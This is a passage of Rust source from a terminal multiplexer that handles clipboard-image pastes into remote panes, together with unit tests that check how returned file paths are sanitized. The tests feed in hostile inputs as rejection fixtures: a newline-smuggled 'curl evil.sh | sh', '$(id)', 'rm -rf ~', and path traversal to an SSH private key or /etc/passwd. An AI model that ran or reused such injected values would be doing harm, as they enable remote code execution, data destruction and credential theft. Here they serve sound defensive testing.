        // separate bridge with no binding of its own, so it cannot be ruled
        // out here. Only reachable when this pane rides a live mount, and a
        // paste is rare next to a keystroke, so the shape check it unlocks is
        // not on the hot path.
        ClientPaneInputEvent::Paste(_) => true,
        _ => false,
    }
}

impl App {
    /// Runs the clipboard-image intercepts over the input events the server is
    /// about to hand to one pane, returning what is left for that pane.
    ///
    /// This is the only production entry point. The server has already
    /// resolved which workspace and pane the events are addressed to, so both
    /// intercepts read that target rather than the focused pane: an image read
    /// takes seconds, and the user is free to move focus while it runs.
    ///
    /// Sits on the pane-input path, so its cost is multiplied by every
    /// keystroke × every pane × every attached client. Three guards, cheapest
    /// first, and each one hands `events` back by value — unmoved, unreordered
    /// and unreallocated:
    ///
    /// 1. `remote_mirrors.is_empty()` is a single length read. No mount
    ///    anywhere on this host means no federated pane can exist, so a purely
    ///    local session pays exactly one branch and nothing else, ever.
    /// 2. [`is_image_paste_candidate`] per event: two enum comparisons, no
    ///    allocation. Ordinary typing stops here even while a mount is live.
    /// 3. Only a batch that survives both reaches the workspace lookup and the
    ///    `remote_mirrors` scan in [`mount_file_staging_support`], and only
    ///    then is a new vector built.
    pub(crate) fn intercept_remote_image_paste_events(
        &mut self,
        ws_idx: usize,
        target_pane_id: PaneId,
        events: Vec<crate::protocol::ClientPaneInputEvent>,
    ) -> Vec<crate::protocol::ClientPaneInputEvent> {
        if self.state.remote_mirrors.is_empty() {
            return events;
        }
        let binding = self.state.remote_image_paste_key;
        if !events
            .iter()
            .any(|event| is_image_paste_candidate(event, binding))
        {
            return events;
        }
        if mount_file_staging_support(&self.state, ws_idx).is_none() {
            return events;
        }
        let mut kept = Vec::with_capacity(events.len());
        for event in events {
            // Re-tested per event rather than reusing the batch answer: a
            // batch qualifies as soon as *one* event is a candidate, and the
            // others in it must still skip the `TerminalKey` build entirely.
            let disposition = if !is_image_paste_candidate(&event, binding) {
                RemoteImagePasteKeyDisposition::Forward
            } else {
                match &event {
                    crate::protocol::ClientPaneInputEvent::Key { .. } => {
                        match event.to_raw_input_event() {
                            crate::raw_input::RawInputEvent::Key(key) => {
                                self.dispatch_remote_image_paste_key(ws_idx, target_pane_id, &key)
                            }
                            _ => RemoteImagePasteKeyDisposition::Forward,
                        }
                    }
                    crate::protocol::ClientPaneInputEvent::Paste(text) => {
                        self.dispatch_bracketed_paste_image(ws_idx, target_pane_id, text)
                    }
                    _ => RemoteImagePasteKeyDisposition::Forward,
                }
            };
            if disposition == RemoteImagePasteKeyDisposition::Forward {
                kept.push(event);
            }
        }
        kept
    }

    /// Runs the `keys.remote_image_paste` intercept for one key.
    pub(crate) fn dispatch_remote_image_paste_key(
        &mut self,
        ws_idx: usize,
        target_pane_id: PaneId,
        key: &crate::input::TerminalKey,
    ) -> RemoteImagePasteKeyDisposition {
        match remote_image_paste_decision(&self.state, ws_idx, key) {
            // Not this intercept's key. Note the absence of any side effect
            // here: callers rely on a fall-through leaving the key completely
            // untouched, so a local ctrl+v still reaches the pane app that
            // wants it (readline quoted-insert, vim visual-block).
            RemoteImagePasteDecision::FallThrough => RemoteImagePasteKeyDisposition::Forward,
            RemoteImagePasteDecision::Unsupported => {
                // The peer cannot stage a file, and that cannot change while
                // the mount lives, so the feature will never work on this
                // pane. Claiming the key anyway would take ctrl+v away from
                // the pane app permanently in exchange for nothing, so the
                // key is delivered and the reason is reported instead.
                //
                // Reported once per pane: the key now reaches the pane app, so
                // pressing it is an ordinary thing to do, and repeating the
                // same unchanging notice on every press would be noise.
                if key.kind == crossterm::event::KeyEventKind::Press
                    && self
                        .remote_image_paste_unsupported_notices
                        .insert(target_pane_id)
                {
                    self.raise_clipboard_stage_toast(TOAST_TITLE_FAILED, TOAST_REMOTE_TOO_OLD);
                }
                RemoteImagePasteKeyDisposition::Forward
            }
            RemoteImagePasteDecision::Capture => {
                // Only a press starts a read. Under the enhanced keyboard
                // protocol a held key also reports `Repeat`, so without this
                // gate one held ctrl+v would start a clipboard read, a
                // blocking thread, a staged remote file and a pasted path per
                // repeat. The repeat is still consumed rather than forwarded:
                // the key belongs to the intercept, and passing it on would
                // send the remote PTY the very `0x16` the press deliberately
                // withheld.
                if key.kind != crossterm::event::KeyEventKind::Press {
                    return RemoteImagePasteKeyDisposition::Consume;
                }
                // Reading the clipboard is unbounded synchronous OS work — a
                // child `osascript` on macOS, a chain of `wl-paste`/`xclip`
                // spawns on Linux — and this is the hot terminal key path
                // shared by every pane and every client, so the read runs
                // off-loop and answers as an event.
                tracing::debug!(
                    ws_idx,
                    ?target_pane_id,
                    "intercepted remote image paste key before forwarding to pane"
                );
                self.begin_remote_clipboard_image_capture(
                    ws_idx,
                    target_pane_id,
                    clipboard_image_reader(),
                );
                RemoteImagePasteKeyDisposition::Consume
            }
        }
    }

    /// Runs the clipboard-image intercepts for one bracketed paste payload.
    ///
    /// Neither recognized shape can be induced remotely. A bracketed paste
    /// only ever originates on a client terminal's stdin; a remote pane
    /// produces terminal *output*, which is parsed into screen cells and never
    /// re-enters input dispatch. So a hostile peer cannot make the local
    /// clipboard be read.
    pub(crate) fn dispatch_bracketed_paste_image(
        &mut self,
        ws_idx: usize,
        target_pane_id: PaneId,
        text: &str,
    ) -> RemoteImagePasteKeyDisposition {
        if text.is_empty() {
            return self.dispatch_empty_bracketed_paste(ws_idx, target_pane_id);
        }
        // A bracketed paste landing on a federated remote pane may be a local
        // screenshot: the terminal (iTerm2/Terminal.app/cmux "paste image as
        // path") substitutes a local temp-file path for the image and delivers
        // *that* as pasted text. Forwarding it verbatim sends the remote host
        // a path that does not exist there.
        match bracketed_paste_image_decision(&self.state, ws_idx, text) {
            BracketedPasteImageDecision::Unsupported => {
                self.raise_clipboard_stage_toast(TOAST_TITLE_FAILED, TOAST_REMOTE_TOO_OLD);
                RemoteImagePasteKeyDisposition::Consume
            }
            BracketedPasteImageDecision::Capture { path, extension } => {
                // Off-loop like the ctrl+v clipboard read: the file can be
                // 16MiB, and a synchronous read here would stall rendering and
                // every pane for its duration.
                self.begin_remote_clipboard_image_capture(ws_idx, target_pane_id, move || {
                    crate::image_path::read_verified_image_drop_file(&path, extension)
                });
                RemoteImagePasteKeyDisposition::Consume
            }
            BracketedPasteImageDecision::FallThrough => RemoteImagePasteKeyDisposition::Forward,
        }
    }

    /// An *empty* bracketed paste (`ESC[200~ESC[201~`) on a federated remote
    /// pane starts the same clipboard-image capture the image-paste key does.
    ///
    /// Measured on macOS: Warp answers Cmd+V with a screenshot on the
    /// clipboard by emitting exactly that empty bracket pair — the image has
    /// no text flavor, so the paste carries no payload. herdr already reads the
    /// same signal this way for its own `herdr --remote` client
    /// (`crate::client`); this extends it to federation mounts.
    ///
    /// An empty paste is also what a genuinely empty *text* clipboard produces,
    /// and the two are indistinguishable at this point. That costs nothing: the
    /// capture simply reports no image and the user gets the ordinary "no image
    /// on the clipboard" toast, which is the truth in both cases.
    fn dispatch_empty_bracketed_paste(
        &mut self,
        ws_idx: usize,
        target_pane_id: PaneId,
    ) -> RemoteImagePasteKeyDisposition {
        // One setting governs the whole clipboard-image-paste feature.
        // `keys.remote_image_paste = ""` is documented as the way to turn it
        // off, and a user who set it did so to stop herdr reading the
        // clipboard, not merely to free one keystroke — so it must also stop
        // this trigger, which reads the same clipboard for the same purpose
        // and would otherwise leave the feature with no off switch at all.
        if self.state.remote_image_paste_key.is_none() {
            return RemoteImagePasteKeyDisposition::Forward;
        }
        match mount_file_staging_support(&self.state, ws_idx) {
            // Not a federated pane: an empty paste is the pane app's business,
            // and reading the clipboard for a local pane would be a side
            // effect the user never asked for.
            None => RemoteImagePasteKeyDisposition::Forward,
            Some(false) => {
                // Same contract as the key intercept: the peer will never be
                // able to stage a file, so the paste is delivered rather than
                // confiscated, and the reason is reported once per pane.
                if self
                    .remote_image_paste_unsupported_notices
                    .insert(target_pane_id)
                {
                    self.raise_clipboard_stage_toast(TOAST_TITLE_FAILED, TOAST_REMOTE_TOO_OLD);
                }
                RemoteImagePasteKeyDisposition::Forward
            }
            Some(true) => {
                tracing::debug!(
                    ws_idx,
                    ?target_pane_id,
                    "intercepted an empty bracketed paste as a clipboard image paste"
                );
                // Off-loop for the same reason as the key path: the read
                // spawns a child process and this is the shared event loop.
                self.begin_remote_clipboard_image_capture(
                    ws_idx,
                    target_pane_id,
                    clipboard_image_reader(),
                );
                RemoteImagePasteKeyDisposition::Consume
            }
        }
    }

    /// Starts the off-loop clipboard read for a claimed image-paste press.
    ///
    /// Records the target as a stable workspace id rather than the index the
    /// decision produced: the read can outlive the workspace, and an index
    /// would then name whichever workspace took over the slot.
    ///
    /// At most one read runs per pane at a time. The trigger is user input, and
    /// input arrives in floods — a held `Cmd+V`, a terminal replaying a paste —
    /// while a read is an unbounded blocking child process. A second read
    /// started while the first is outstanding would ask the same clipboard the
    /// same question, so the flood is answered by the read already running
    /// rather than by one child per event. A distinct later trigger, once the
    /// pane has no read outstanding, is never dropped.
    pub(crate) fn begin_remote_clipboard_image_capture<F>(
        &mut self,
        ws_idx: usize,
        target_pane_id: PaneId,
        read: F,
    ) where
        F: FnOnce() -> Option<crate::platform::ClipboardImage> + Send + 'static,
    {
        let Some(workspace_id) = self.state.workspaces.get(ws_idx).map(|ws| ws.id.clone()) else {
            return;
        };
        if !self
            .remote_clipboard_image_reads_in_flight
            .insert(target_pane_id)
        {
            tracing::debug!(
                ?target_pane_id,
                "a clipboard image read is already running for this pane; not starting another"
            );
            return;
        }
        spawn_clipboard_image_capture(
            self.event_tx.clone(),
            workspace_id,
            target_pane_id,
            CLIPBOARD_IMAGE_READ_TIMEOUT,
            read,
        );
    }

    /// `AppEvent::RemoteClipboardImageCaptured` handler: the off-loop read
    /// finished, so the press can finally be answered.
    pub(crate) fn handle_remote_clipboard_image_captured(
        &mut self,
        workspace_id: String,
        target_pane_id: PaneId,
        capture: crate::events::ClipboardImageCapture,
    ) {
        use crate::events::ClipboardImageCapture;

        // The read this event answers is over, whatever it found, so the pane
        // may start another one. Released before any early return below: a
        // "no image" or timed-out answer must not leave the pane unable to try
        // again.
        self.remote_clipboard_image_reads_in_flight
            .remove(&target_pane_id);

        let image = match capture {
            ClipboardImageCapture::Image(image) => image,
            ClipboardImageCapture::NoImage => {
                self.raise_clipboard_stage_toast(TOAST_TITLE_FAILED, TOAST_NO_CLIPBOARD_IMAGE);
                return;
            }
            ClipboardImageCapture::ReadTimedOut => {
                tracing::warn!("the clipboard owner did not answer an image read in time");
                self.raise_clipboard_stage_toast(
                    TOAST_TITLE_FAILED,
                    TOAST_CLIPBOARD_READ_TIMED_OUT,
                );
                return;
            }
        };
        // Silent when the workspace is gone: the user closed the thing they
        // pasted into while the read ran, so there is nothing to report and
        // nowhere sensible to report it.
        let Some(ws_idx) = self
            .state
            .workspaces
            .iter()
            .position(|ws| ws.id == workspace_id)
        else {
            tracing::warn!(
                %workspace_id,
                "dropping a clipboard image whose workspace closed during the read"
            );
            return;
        };
        self.handle_remote_image_paste(ws_idx, target_pane_id, image);
    }

    /// Everything the image-paste intercept does after the clipboard read.
    ///
    /// Split from the dispatchers so the success branch is drivable in a test:
    /// the OS clipboard cannot be made to hold a PNG in CI, but a
    /// `ClipboardImage` literal handed to this function exercises the same
    /// size check, the same staging call and the same failure reporting.
    pub(crate) fn handle_remote_image_paste(
        &mut self,
        ws_idx: usize,
        target_pane_id: PaneId,
        image: crate::platform::ClipboardImage,
    ) -> ImagePasteOutcome {
        // Checked here rather than left to the peer: an oversized frame is
        // dropped by the transport as a protocol violation, which surfaces to
        // the user as a closed connection and reads as "the mount died".
        if image.bytes.len() > crate::protocol::MAX_CLIPBOARD_IMAGE_PAYLOAD {
            tracing::warn!(
                bytes = image.bytes.len(),
                max = crate::protocol::MAX_CLIPBOARD_IMAGE_PAYLOAD,
                "refusing to stage a clipboard image larger than the paste limit"
            );
            self.raise_clipboard_stage_toast(TOAST_TITLE_FAILED, TOAST_IMAGE_TOO_LARGE);
            return ImagePasteOutcome::Rejected;
        }
        // Every refusal inside `begin_remote_clipboard_stage` raises its own
        // toast, so a rejection here is already reported by the time it
        // returns; the outcome exists for the caller, not for the user.
        match self.begin_remote_clipboard_stage(ws_idx, target_pane_id, &image) {
            Ok(()) => ImagePasteOutcome::Staged,
            Err(_) => ImagePasteOutcome::Rejected,
        }
    }
}

/// Registers a pending stage. Test-only: production always mints through
/// `begin_remote_clipboard_stage`, which owns the wire send and the budget.
#[cfg(test)]
impl App {
    pub(crate) fn test_register_pending_clipboard_stage(
        &mut self,
        request_id: u64,
        pending: PendingClipboardStage,
    ) {
        self.pending_remote_clipboard_stages
            .insert(request_id, pending);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use super::*;
    use crate::config::Config;
    use crate::remote::federation::protocol::Capability;
    use crate::workspace::Workspace;
    use bytes::Bytes;
    use std::sync::Arc;
    use tokio::sync::mpsc;
    use tokio::sync::Notify;

    const HOST: &str = "remote-host";

    fn host_key(target: &str) -> HostKey {
        HostKey::new(target, "s1")
    }

    fn staged_path() -> String {
        format!("/tmp/herdr-clipboard-images-501/{FEDERATION_CLIPBOARD_PREFIX}1-0-image.png")
    }

    fn test_app() -> App {
        let (_api_tx, api_rx) = mpsc::unbounded_channel();
        let mut app = App::new(
            &Config::default(),
            crate::app::AppPolicy::TEST,
            None,
            api_rx,
            crate::api::EventHub::default(),
        );
        app.state.workspaces = vec![Workspace::test_new("remote")];
        app.state.ensure_test_terminals();
        app.state.active = Some(0);
        app.state.selected = 0;
        // The default delivery is `Off`, which drops every notification on the
        // floor and would make "a failure was reported" unobservable.
        app.state.toast_config.delivery = crate::config::ToastDelivery::Herdr;
        app
    }

    /// Attaches a real `TerminalRuntime` to workspace `ws_idx`'s root pane and
    /// hands back its pane id plus the receiver the paste would land on.
    fn attach_runtime(app: &mut App, ws_idx: usize) -> (PaneId, mpsc::Receiver<Bytes>) {
        attach_runtime_with_capacity(app, ws_idx, None)
    }

    fn attach_runtime_with_capacity(
        app: &mut App,
        ws_idx: usize,
        capacity: Option<usize>,
    ) -> (PaneId, mpsc::Receiver<Bytes>) {
        let pane_id = app.state.workspaces[ws_idx].tabs[0].root_pane;
        let terminal_id = app.state.workspaces[ws_idx].tabs[0].panes[&pane_id]
            .attached_terminal_id
            .clone();
        let (runtime, rx) = match capacity {
            Some(capacity) => {
                crate::terminal::TerminalRuntime::test_with_channel_capacity(80, 24, capacity)
            }
            None => crate::terminal::TerminalRuntime::test_with_channel(80, 24),
        };
        app.terminal_runtimes.insert(terminal_id, runtime);
        (pane_id, rx)
    }

    fn pending_for(
        app: &App,
        pane_id: PaneId,
        origin: HostKey,
        connection_epoch: MountConnectionEpoch,
    ) -> PendingClipboardStage {
        PendingClipboardStage {
            workspace_id: app.state.workspaces[0].id.clone(),
            target_pane_id: pane_id,
            origin,
            connection_epoch,
            payload_len: 1024,
            deadline: Instant::now() + Duration::from_secs(60),
        }
    }

    fn ready_event(
        request_id: u64,
        remote_path: &str,
        origin: HostKey,
        connection_epoch: MountConnectionEpoch,
    ) -> AppEvent {
        AppEvent::FederationClipboardStageReady {
            request_id,
            remote_path: remote_path.to_string(),
            origin,
            connection_epoch,
        }
    }

    /// The shared rejection fixture: a live pending entry, a real pane runtime,
    /// and the answer driven through the production event entry point. Returns
    /// what the pane actually received.
    fn drive_ready_through_handler(remote_path: &str) -> (App, Vec<Bytes>) {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        let pending = pending_for(&app, pane_id, host_key(HOST), epoch);
        app.test_register_pending_clipboard_stage(7, pending);

        app.handle_internal_event(ready_event(7, remote_path, host_key(HOST), epoch));

        let mut received = Vec::new();
        while let Ok(bytes) = rx.try_recv() {
            received.push(bytes);
        }
        (app, received)
    }

    fn assert_rejected(remote_path: &str) {
        let (app, received) = drive_ready_through_handler(remote_path);
        assert!(
            received.is_empty(),
            "{remote_path} reached the pane: {received:?}"
        );
        assert!(
            app.state.toast.is_some(),
            "{remote_path} was rejected without telling the user"
        );
        assert!(
            app.pending_remote_clipboard_stages.is_empty(),
            "{remote_path} left its pending entry behind"
        );
    }

    // Positive control for every rejection test below: the identical fixture,
    // with a path a well-behaved remote would actually return, must put exactly
    // that path on the pane. Without it, "the receiver was empty" would be
    // satisfied by a handler that never runs at all.
    #[tokio::test]
    async fn a_well_formed_staged_path_is_injected() {
        let path = staged_path();
        let (app, received) = drive_ready_through_handler(&path);
        assert_eq!(received.len(), 1, "expected exactly one paste");
        assert_eq!(received[0], Bytes::from(path));
        assert!(
            app.state.toast.is_none(),
            "a successful paste must be quiet"
        );
        assert!(app.pending_remote_clipboard_stages.is_empty());
    }

    #[tokio::test]
    async fn returned_remote_path_with_embedded_newline_is_rejected_before_paste() {
        assert_rejected("/tmp/x\n; curl evil.sh | sh\n");
        assert_rejected(&format!("{}\nid\n", staged_path()));
        // The named line-break guard, not merely one of the broader ones that
        // also happen to cover this byte: pinning the reason is what makes the
        // guard fail on its own if it is ever weakened.
        assert_eq!(
            sanitize_returned_remote_path(&format!("{}\nid\n", staged_path())),
            Err(PathRejection::LineBreak)
        );
        assert_eq!(
            sanitize_returned_remote_path(&format!("{}\rid", staged_path())),
            Err(PathRejection::LineBreak)
        );
    }

    #[tokio::test]
    async fn returned_remote_path_with_esc_sequence_is_rejected_before_paste() {
        assert_rejected(&format!("{}\x1b[2J", staged_path()));
        // Pinned to the control-byte guard specifically, so that guard cannot
        // be removed on the grounds that a later one also rejects the input.
        assert_eq!(
            sanitize_returned_remote_path(&format!("{}\x1b[2J", staged_path())),
            Err(PathRejection::ControlByte)
        );
    }

    #[tokio::test]
    async fn returned_remote_path_with_shell_metacharacters_is_rejected_before_paste() {
        for path in [
            "/tmp/herdr-clipboard-images-501/$(id).png",
            "/tmp/a; rm -rf ~/.png",
            "/tmp/x/federation-clipboard-1-0-a|b.png",
            "/tmp/x/federation-clipboard-1-0-a b.png",
            "/tmp/x/federation-clipboard-1-0-`id`.png",
        ] {
            assert_rejected(path);
        }
    }

    #[tokio::test]
    async fn returned_remote_path_that_walks_out_of_the_staging_directory_is_rejected() {
        // Every one of these is absolute, control-free, allowlist-clean, and
        // ends in a component carrying the staging prefix, so nothing but the
        // component check can refuse them. The first names a private key the
        // remote never staged.
        for escaping in [
            format!(
                "/tmp/herdr-clipboard-images-501/../../home/me/.ssh/{FEDERATION_CLIPBOARD_PREFIX}id_rsa"
            ),
            format!("/../{FEDERATION_CLIPBOARD_PREFIX}1-0-image.png"),
            format!("/tmp/./herdr-clipboard-images-501/{FEDERATION_CLIPBOARD_PREFIX}1-0-image.png"),
        ] {
            assert_rejected(&escaping);
            // Pinned to the component guard rather than merely "rejected", so
            // it cannot be dropped on the grounds that something else caught
            // these inputs.
            assert_eq!(
                sanitize_returned_remote_path(&escaping),
                Err(PathRejection::RelativeComponent),
                "{escaping}"
            );
        }

        // The same fixture with an ordinary staged path still injects, so the
        // rejections above describe the guard and not a dead handler.
        let (_app, received) = drive_ready_through_handler(&staged_path());
        assert_eq!(received, vec![Bytes::from(staged_path())]);
    }

    #[tokio::test]
    async fn returned_remote_path_without_the_staging_prefix_is_rejected() {
        assert_rejected("/etc/passwd");
        assert_rejected("/tmp/herdr-clipboard-images-501/client-1-clipboard-9-0.png");
        assert_rejected("");
        assert_rejected("relative/federation-clipboard-1-0-image.png");
    }

    #[tokio::test]
    async fn staged_path_that_cannot_be_delivered_to_the_pane_reports_failure_instead_of_succeeding_silently(
    ) {
        // (a) the pane's input channel is full.
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime_with_capacity(&mut app, 0, Some(1));
        let terminal_id = app.state.workspaces[0].tabs[0].panes[&pane_id]
            .attached_terminal_id
            .clone();
        app.terminal_runtimes
            .get(&terminal_id)
            .unwrap()
            .try_send_paste("filler".to_string())
            .expect("the first paste fills the one-slot channel");
        let epoch = MountConnectionEpoch::mint();
        let pending = pending_for(&app, pane_id, host_key(HOST), epoch);
        app.test_register_pending_clipboard_stage(7, pending);
        app.handle_internal_event(ready_event(7, &staged_path(), host_key(HOST), epoch));
        assert!(
            app.state.toast.is_some(),
            "a full pane channel must not read as a successful paste"
        );

        // (b) the pane's receiver has been dropped.
        let mut app = test_app();
        let (pane_id, rx) = attach_runtime(&mut app, 0);
        drop(rx);
        let epoch = MountConnectionEpoch::mint();
        let pending = pending_for(&app, pane_id, host_key(HOST), epoch);
        app.test_register_pending_clipboard_stage(9, pending);
        app.handle_internal_event(ready_event(9, &staged_path(), host_key(HOST), epoch));
        assert!(
            app.state.toast.is_some(),
            "a closed pane channel must not read as a successful paste"
        );
    }

    #[tokio::test]
    async fn clipboard_stage_request_times_out_when_remote_never_responds() {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        let pending = pending_for(&app, pane_id, host_key(HOST), epoch);
        app.test_register_pending_clipboard_stage(11, pending);

        app.handle_internal_event(AppEvent::FederationClipboardStageTimedOut {
            request_id: 11,
            origin: host_key(HOST),
            connection_epoch: epoch,
        });

        assert!(app.pending_remote_clipboard_stages.is_empty());
        assert!(app.state.toast.is_some(), "a timeout must tell the user");
        assert!(rx.try_recv().is_err(), "a timeout must not paste anything");

        // A second timeout for the same request is a no-op, not a second toast
        // for a request that has already been reported.
        app.state.toast = None;
        app.handle_internal_event(AppEvent::FederationClipboardStageTimedOut {
            request_id: 11,
            origin: host_key(HOST),
            connection_epoch: epoch,
        });
        assert!(app.state.toast.is_none());
    }

    /// Both waits a stage schedules for itself, driven end to end on a real
    /// clock with the two delays shortened.
    ///
    /// Nothing here injects an event by hand, which is the point: the only
    /// thing that can put a still-running or timed-out event on the App's own
    /// channel is a timer the request scheduled, so removing either one leaves
    /// this test waiting for an event that never comes.
    #[tokio::test]
    async fn a_stage_schedules_the_waits_that_announce_it_and_then_reap_it() {
        let mut app = test_app();
        let (pane_id, _out_rx) = attach_live_mount(&mut app);
        app.begin_remote_clipboard_stage_with_timings(
            0,
            pane_id,
            &test_image(),
            Duration::from_millis(10),
            Duration::from_millis(80),
        )
        .expect("the mount accepts the stage");
        assert_eq!(app.pending_remote_clipboard_stages.len(), 1);
        app.state.toast = None;

        let mut announced_while_pending = false;
        let mut reaped = false;
        let deadline = Instant::now() + Duration::from_secs(10);
        while !reaped && Instant::now() < deadline {
            let Ok(Some(ev)) =
                tokio::time::timeout(Duration::from_secs(5), app.event_rx.recv()).await
            else {
                break;
            };
            match &ev {
                AppEvent::FederationClipboardStageStillRunning { .. } => {
                    app.handle_internal_event(ev);
                    announced_while_pending = app.state.toast.as_ref().map(|t| t.title.as_str())
                        == Some(TOAST_TITLE_SAVING);
                }
                AppEvent::FederationClipboardStageTimedOut { .. } => {
                    app.handle_internal_event(ev);
                    reaped = true;
                }
                other => panic!("an unexpected event reached the stage timers: {other:?}"),
            }
        }

        assert!(
            announced_while_pending,
            "no wait told the user the stage was still working"
        );
        assert!(reaped, "no wait reaped a stage the remote never answered");
        assert!(
            app.pending_remote_clipboard_stages.is_empty(),
            "an unanswered stage must not hold its in-flight slot forever"
        );
        assert_eq!(
            app.state.toast.as_ref().map(|toast| toast.context.as_str()),
            Some("the remote host did not answer in time")
        );
    }

    #[test]
    fn clipboard_stage_timeout_is_proportional_to_payload_size_not_fixed() {
        let small = stage_timeout_budget(64 * 1024);
        let large = stage_timeout_budget(16 * 1024 * 1024);
        assert!(
            large > small,
            "a 16 MiB payload must get more time than a 64 KiB one ({large:?} vs {small:?})"
        );
        assert!(small >= STAGE_TIMEOUT_BASE);
    }

    #[tokio::test]
    async fn clipboard_stage_response_from_a_restarted_remote_is_dropped_not_injected() {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let live = MountConnectionEpoch::mint();
        let superseded = MountConnectionEpoch::mint();
        assert_ne!(live, superseded);
        app.test_register_pending_clipboard_stage(
            3,
            pending_for(&app, pane_id, host_key(HOST), live),
        );

        app.handle_internal_event(ready_event(3, &staged_path(), host_key(HOST), superseded));
        assert!(rx.try_recv().is_err(), "a superseded answer must not paste");
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&3),
            "a fenced answer must leave the entry claimable"
        );

        // Positive control: the same event on the live epoch does inject.
        app.handle_internal_event(ready_event(3, &staged_path(), host_key(HOST), live));
        assert_eq!(rx.try_recv().unwrap(), Bytes::from(staged_path()));
    }

    #[tokio::test]
    async fn clipboard_stage_response_after_a_remount_to_the_same_running_remote_is_dropped() {
        use crate::remote::federation::id::{Mount, ServerInstanceId};
        // The remote process never restarted, so both mounts carry the same
        // instance id and the same (constant) generation. Only the locally
        // minted epoch differs, so only the epoch check can do the work.
        let first = Mount {
            host_key: host_key(HOST),
            server_instance_id: ServerInstanceId("inst-1".to_string()),
            mount_generation: 1,
        };
        let second = Mount {
            host_key: host_key(HOST),
            server_instance_id: ServerInstanceId("inst-1".to_string()),
            mount_generation: 1,
        };
        assert_eq!(first.server_instance_id, second.server_instance_id);
        assert_eq!(first.mount_generation, second.mount_generation);

        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let superseded = MountConnectionEpoch::mint();
        let fresh = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            5,
            pending_for(&app, pane_id, first.host_key.clone(), fresh),
        );

        app.handle_internal_event(ready_event(
            5,
            &staged_path(),
            second.host_key.clone(),
            superseded,
        ));
        assert!(rx.try_recv().is_err());
        assert!(app.pending_remote_clipboard_stages.contains_key(&5));

        app.handle_internal_event(ready_event(5, &staged_path(), second.host_key, fresh));
        assert_eq!(rx.try_recv().unwrap(), Bytes::from(staged_path()));
    }

    #[tokio::test]
    async fn clipboard_stage_response_from_a_different_hostkey_is_rejected() {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            13,
            pending_for(&app, pane_id, host_key(HOST), epoch),
        );

        app.handle_internal_event(ready_event(
            13,
            &staged_path(),
            host_key("other-host"),
            epoch,
        ));
        assert!(rx.try_recv().is_err(), "a foreign mount must not paste");
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&13),
            "a foreign answer must not evict the legitimate one"
        );

        app.handle_internal_event(ready_event(13, &staged_path(), host_key(HOST), epoch));
        assert_eq!(rx.try_recv().unwrap(), Bytes::from(staged_path()));
    }

    #[tokio::test]
    async fn remote_paste_injects_staged_path_through_local_paste_command() {
        let mut app = test_app();
        app.state
            .workspaces
            .push(crate::workspace::Workspace::test_new("elsewhere"));
        app.state.ensure_test_terminals();
        let (mint_time_pane, mut mint_rx) = attach_runtime(&mut app, 0);
        let (_focused_pane, mut focused_rx) = attach_runtime(&mut app, 1);
        // The user moves on while the transfer runs.
        app.state.selected = 1;
        app.state.active = Some(1);

        let epoch = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            17,
            pending_for(&app, mint_time_pane, host_key(HOST), epoch),
        );
        app.handle_internal_event(ready_event(17, &staged_path(), host_key(HOST), epoch));

        assert_eq!(mint_rx.try_recv().unwrap(), Bytes::from(staged_path()));
        assert!(
            focused_rx.try_recv().is_err(),
            "the path must go to the pane that asked, not the focused one"
        );
    }

    #[tokio::test]
    async fn two_pastes_in_quick_succession_resolve_independently_and_in_any_completion_order() {
        let mut app = test_app();
        app.state
            .workspaces
            .push(crate::workspace::Workspace::test_new("second"));
        app.state.ensure_test_terminals();
        let (first_pane, mut first_rx) = attach_runtime(&mut app, 0);
        let (second_pane, mut second_rx) = attach_runtime(&mut app, 1);
        let epoch = MountConnectionEpoch::mint();

        let first = PendingClipboardStage {
            workspace_id: app.state.workspaces[0].id.clone(),
            target_pane_id: first_pane,
            origin: host_key(HOST),
            connection_epoch: epoch,
            payload_len: 1,
            deadline: Instant::now() + Duration::from_secs(60),
        };
        let second = PendingClipboardStage {
            workspace_id: app.state.workspaces[1].id.clone(),
            target_pane_id: second_pane,
            origin: host_key(HOST),
            connection_epoch: epoch,
            payload_len: 1,
            deadline: Instant::now() + Duration::from_secs(60),
        };
        app.test_register_pending_clipboard_stage(21, first);
        app.test_register_pending_clipboard_stage(22, second);

        let second_path =
            format!("/tmp/herdr-clipboard-images-501/{FEDERATION_CLIPBOARD_PREFIX}2-0-image.png");
        app.handle_internal_event(ready_event(22, &second_path, host_key(HOST), epoch));
        app.handle_internal_event(ready_event(21, &staged_path(), host_key(HOST), epoch));

        assert_eq!(second_rx.try_recv().unwrap(), Bytes::from(second_path));
        assert_eq!(first_rx.try_recv().unwrap(), Bytes::from(staged_path()));
        assert!(app.pending_remote_clipboard_stages.is_empty());
    }

    #[test]
    fn clipboard_stage_toast_copy_is_defined_for_every_failure_variant() {
        for failure in [
            ClipboardStageFailure::InvalidFilename,
            ClipboardStageFailure::UnsupportedExtension,
            ClipboardStageFailure::InvalidPayload,
            ClipboardStageFailure::PayloadTooLarge,
            ClipboardStageFailure::QuotaExceeded,
            ClipboardStageFailure::StagingUnavailable,
            ClipboardStageFailure::Busy,
            ClipboardStageFailure::WriteFailed,
        ] {
            let context = clipboard_stage_failure_context(failure);
            assert!(!context.is_empty(), "{failure:?} has no explanation");
            assert!(
                context.chars().count() <= 60,
                "{failure:?}'s explanation does not fit a toast: {context}"
            );
        }
        assert!(!TOAST_TITLE_FAILED.is_empty());
    }

    #[tokio::test]
    async fn a_stage_failure_from_the_remote_raises_a_toast_and_claims_the_entry() {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            31,
            pending_for(&app, pane_id, host_key(HOST), epoch),
        );

